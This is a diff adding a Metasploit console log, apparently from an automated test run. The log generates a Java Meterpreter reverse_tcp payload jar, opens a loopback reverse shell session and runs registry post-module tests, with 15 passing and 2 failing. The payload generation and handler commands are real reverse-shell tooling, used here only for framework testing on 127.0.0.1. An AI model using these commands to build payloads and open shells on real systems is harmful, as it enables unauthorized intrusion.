@@ -1,0 +1,45 @@
+use java/meterpreter/reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20231026-3620-vmrq5xtxt
+msf6 payload(java/meterpreter/reverse_tcp) > msf6 payload(java/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20231026-3620-vmrq5xtxt
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20231026-3620-1o9ixw.jar -f jar AutoVerifySessionTimeout=30 lport=6007 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20231026-3620-v00x7txt spawn=0
+[*] Writing 5259 bytes to D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20231026-3620-1o9ixw.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 6
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6007 
+[*] Sending stage (57692 bytes) to 127.0.0.1
+[*] Meterpreter session 7 opened (127.0.0.1:6007 -> 127.0.0.1:50112) at 2023-10-26 19:05:31 +0000
+use test/registry
+msf6 post(test/registry) > run session=7 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_registry_check_key_exists, stdapi_registry_create_key, stdapi_registry_delete_key, stdapi_registry_enum_key_direct, stdapi_registry_enum_value_direct, stdapi_registry_load_key, stdapi_registry_open_key, stdapi_registry_query_value_direct, stdapi_registry_set_value_direct, stdapi_registry_unload_key, stdapi_sys_config_getprivs
+[*] Running against session 7
+[*] Session type is meterpreter and platform is windows
+[+] should create keys
+[+] should write REG_BINARY values
+[+] should write REG_DWORD values
+[-] FAILED: should write REG_EXPAND_SZ values
+[+] should write REG_MULTI_SZ values
+[+] should write REG_QWORD values
+[+] should write REG_SZ values
+[+] should delete keys
+[+] should create unicode keys
+[-] FAILED: should write REG_SZ unicode values
+[+] should delete unicode keys
+[+] should evaluate key existence
+[*] PENDING: should evaluate value existence
+[+] should read values
+[+] should read values with a 32-bit view
+[+] should read values with a 64-bit view
+[+] should return normalized values
+[+] should enumerate keys and values
+[*] Testing complete in 3.96 seconds
+[-] Passed: 15; Failed: 2; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/registry) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 7 closed.
+msf6 post(test/registry) > Stopping all jobs...
